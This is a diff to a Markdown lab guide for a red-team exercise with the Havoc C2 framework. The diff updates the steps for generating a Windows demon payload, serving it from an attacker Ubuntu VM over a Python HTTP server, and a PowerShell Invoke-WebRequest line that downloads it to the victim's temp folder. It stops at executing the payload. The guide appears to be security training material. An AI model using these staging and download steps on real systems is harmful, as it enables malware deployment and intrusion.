@@ -261,10 +261,10 @@ Once it's done building, you will see the Teamserver mention the **Custom TCP Po
 
 <img width="1067" height="564" alt="image" src="https://github.com/user-attachments/assets/e726cacd-5a77-4848-bbb0-a0fa5e19a73d" />
 
-Step 3 (Start the Client): Open a NEW tab/terminal on your Ubuntu VM (do not close the SSH session). Start the pre-installed Havoc Client:
+Step 3 (Start the Client): Open a NEW tab/terminal on your Ubuntu VM (do not close the SSH session). Move to the **Lab Directory**. Start the pre-installed Havoc Client:
 
 ``` bash
-cd /opt/havoc-client
+cd ~/BnB/Havoc
 ./Havoc
 ```
 
@@ -287,16 +287,20 @@ Create a Listener: Go to View -> Listeners -> Add. Give the listener a name. Set
 
 <img width="613" height="831" alt="image" src="https://github.com/user-attachments/assets/e2dcbab3-7ccf-4291-9a9a-5a0db746dcfa" />
 
-Generate the Payload: Go to Attack -> Payload. Select your HTTP Listener, choose 'Windows' and 'Executable (.exe)'. Click Generate and save the file as demon.exe.
+Generate the Payload: Go to Attack -> Payload. Select your HTTP Listener, choose 'Windows' and 'Executable (.exe)'. Click Generate and save the *demon.x64.exe* file in the **lab directory (~/BnB/Havoc)**.
 
 <img width="1854" height="1049" alt="image" src="https://github.com/user-attachments/assets/2187d663-8c58-4770-8c36-6eb3790766de" />
 
 
-Start a quick Python web server on the Ubuntu VM to host the demon.exe so the victim machine can download it (make sure you run this in the directory where demon.exe was saved):
+Start a quick Python web server on the Ubuntu VM to host the demon.x64.exe so the victim machine can download it (make sure you run this in the lab directory, where demon.x64.exe was saved) : 
 
 ```bash
+cd ~/BnB/Havoc
 python3 -m http.server 8000
 ```
+
+<img width="685" height="88" alt="image" src="https://github.com/user-attachments/assets/1527e4e6-6011-495e-b8d5-2c01547ad6ca" />
+
 
 ## Phase 3: Payload Delivery & Exfiltration
 ### Environment: [Windows VM] (Victim) & [Ubuntu VM] (Attacker)
@@ -306,7 +310,7 @@ We now switch to the compromised *Windows VM* to deliver the payload and execute
 - Download the Havoc Demon directly from our Ubuntu server. **Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.**
 
 ```powershell
-Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8000/demon.exe" -OutFile "$env:TEMP\demon.exe"
+Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8000/demon.x64.exe" -OutFile "$env:TEMP\demon.exe"
 ```
 
 - Execute the payload:
